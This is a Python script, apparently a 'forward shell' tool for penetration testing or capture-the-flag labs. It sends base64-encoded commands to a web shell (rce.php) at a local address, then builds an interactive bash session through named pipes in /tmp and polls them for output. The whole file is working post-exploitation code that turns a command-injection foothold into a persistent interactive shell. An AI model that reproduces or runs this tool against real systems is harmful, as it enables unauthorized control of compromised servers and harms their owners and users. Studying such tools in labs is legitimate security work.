#!/usr/bin/env python3
import sys
import requests
from time import sleep
from threading import Thread
from random import randint
from base64 import b64encode

WRITABLE_FOLDER = "/tmp"
BEACONING_DELAY = 0.3
UPGRADE_CMD_DELAY = 2
WTF_CMD = ["env", "pwd", "whoami"]

def execute(cmd, timeout=None):
    encoded = b64encode(cmd.encode()).decode()
    r = requests.get("http://127.0.0.1:54321/rce.php?cmd=%s" % encoded, timeout=timeout)
    return r.text.strip()

class GetOutput(Thread):
    def __init__(self, sessid):
        super().__init__()
        self.sessid = sessid
        self.pause = False
        self.stop = False

    def read_output(self):
        out = execute("cat /tmp/out.%d" % self.sessid)
        if out:
            execute("echo '' > /tmp/out.%d" % self.sessid)
            return out
        return None

    def run(self):
        while not self.stop:
            while self.pause:
                sleep(0.1)
            out = self.read_output()
            if out:
                print(out, end="", flush=True)
            sleep(BEACONING_DELAY)

class NamedPipe:
    def __init__(self):
        self.sessid = randint(1000, 100000)

    def create(self):
        execute("mkfifo /tmp/in.%d" % self.sessid)
        execute("tail -f /tmp/in.%d | /bin/bash -i > /tmp/out.%d 2>&1" % (self.sessid, self.sessid), timeout=3.5)

class FShell:
    def __init__(self, sessid, output_thread):
        self.sessid = sessid
        self.out = output_thread

    def run(self):
        while True:
            try:
                cmd = input()
            except (EOFError, KeyboardInterrupt):
                break
            if cmd == "exit":
                break
            execute("echo %s > /tmp/in.%d" % (cmd, self.sessid))

if __name__ == "__main__":
    np = NamedPipe()
    np.create()
    execute("echo id > /tmp/in.%d" % np.sessid)
    out = GetOutput(np.sessid)
    out.start()
    shell = FShell(np.sessid, out)
    shell.run()
